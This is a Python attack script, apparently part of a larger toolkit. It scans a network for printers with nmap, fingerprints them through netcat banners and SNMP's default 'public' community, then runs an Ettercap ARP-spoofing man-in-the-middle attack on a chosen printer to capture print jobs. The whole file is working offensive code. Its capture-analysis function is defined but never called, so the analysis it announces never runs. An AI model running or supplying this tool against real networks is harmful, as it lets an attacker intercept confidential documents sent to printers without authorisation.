#!/usr/bin/env python3
import ipaddress
import subprocess
import tempfile
import signal
import os
import sys
import re

temp_file = None
ettercap_process = None

def validate_network_input(network):
    try:
        ipaddress.ip_network(network)
        return True
    except ValueError:
        return False

def scan_for_printers(network):
    print(f"[+] Scanning network {network} for printers...")
    with tempfile.NamedTemporaryFile(delete=False, mode='w+') as tmp:
        global temp_file
        temp_file = tmp.name
        subprocess.run(
            ["nmap", "-p", "9100,631", "--open", "-oG", temp_file, network],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        printers = []
        with open(temp_file, 'r') as f:
            for line in f:
                if "Ports" in line and ("9100/open" in line or "631/open" in line):
                    match = re.search(r'Host: (\d+\.\d+\.\d+\.\d+)', line)
                    if match:
                        printers.append(match.group(1))
        return printers

def detect_printer_details(ip):
    details = {"ip": ip, "banner": None, "snmp": None}

    try:
        banner = subprocess.check_output(
            ["timeout", "3", "nc", "-w", "3", ip, "9100"],
            stderr=subprocess.DEVNULL,
            input=b"\n",
        ).decode("utf-8", errors="ignore").strip()
        if banner:
            details["banner"] = banner
    except:
        details["banner"] = None

    try:
        snmp_data = subprocess.check_output(
            ["snmpget", "-v2c", "-c", "public", ip, "1.3.6.1.2.1.1.1.0"],
            stderr=subprocess.DEVNULL,
        ).decode("utf-8", errors="ignore").strip()
        match = re.search(r'STRING: (.+)', snmp_data)
        if match:
            details["snmp"] = match.group(1)
    except:
        details["snmp"] = None

    return details

def start_ettercap(target_ip, network):
    global ettercap_process
    print(f"[+] Starting Ettercap interception on {target_ip}...")
    capture_file = f"capture_{target_ip}.pcap"
    ettercap_cmd = [
        "sudo", "ettercap", "-T", "-q", "-i", "eth1", "-M", "arp:remote",
        f"/{network}/", f"/{target_ip}/", "-w", capture_file
    ]
    ettercap_process = subprocess.Popen(ettercap_cmd)
    return capture_file

def read_capture(capture_file):
    print(f"\n[+] Analyzing file {capture_file}...")
    try:
        output = subprocess.check_output(
            ["tcpdump", "-nn", "-A", "-r", capture_file],
            stderr=subprocess.DEVNULL
        ).decode("utf-8", errors="ignore")
        if "PJL" in output or "POSTSCRIPT" in output or "PDF" in output:
            print("[*] Print data detected in capture:\n")
            print(output)
        else:
            print("[!] No print data detected or unreadable.")
    except subprocess.CalledProcessError:
        print("[!] Error reading capture file.")

def cleanup_and_exit(signum=None, frame=None):
    global temp_file, ettercap_process
    print("\n[!] Interruption detected. Cleaning up...")
    if ettercap_process:
        ettercap_process.terminate()
    if temp_file and os.path.exists(temp_file):
        os.remove(temp_file)
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup_and_exit)

# Main program
try:
    try:
        network = input("[?] Enter network range to scan (ex: 192.168.1.0/24): ").strip()
    except KeyboardInterrupt:
        print("\n[!] Interruption detected. Cleaning up...")
        sys.exit(0)

    if not validate_network_input(network):
        print("[!] Invalid IP range.")
        sys.exit(1)

    printers = scan_for_printers(network)
    if not printers:
        print("[!] No printers detected.")
        print("[*] Returning to main menu...")
        sys.exit(0)

    print("\n[+] Detected printers:")
    for idx, ip in enumerate(printers):
        info = detect_printer_details(ip)
        print(f"  {idx + 1}. {ip}")
        if info["snmp"]:
            print(f"     SNMP   : {info['snmp']}")
        if info["banner"]:
            print(f"     Banner : {info['banner']}")

    try:
        choice = input("\n[?] Do you want to launch a MITM attack using Ettercap? (y/n): ").strip().lower()
    except KeyboardInterrupt:
        print("\n[!] Interruption detected. Cleaning up...")
        sys.exit(0)

    if choice != "y":
        cleanup_and_exit()

    try:
        selected = input("[?] Enter the number of the printer to target: ").strip()
    except KeyboardInterrupt:
        print("\n[!] Interruption detected. Cleaning up...")
        sys.exit(0)

    if not selected.isdigit() or int(selected) < 1 or int(selected) > len(printers):
        print("[!] Invalid choice.")
        sys.exit(1)

    target_ip = printers[int(selected) - 1]
    capture_file = start_ettercap(target_ip, network)
    print(f"[+] Capture in progress. Press CTRL+C to stop and analyze file {capture_file}...")

    ettercap_process.wait()

except KeyboardInterrupt:
    cleanup_and_exit()
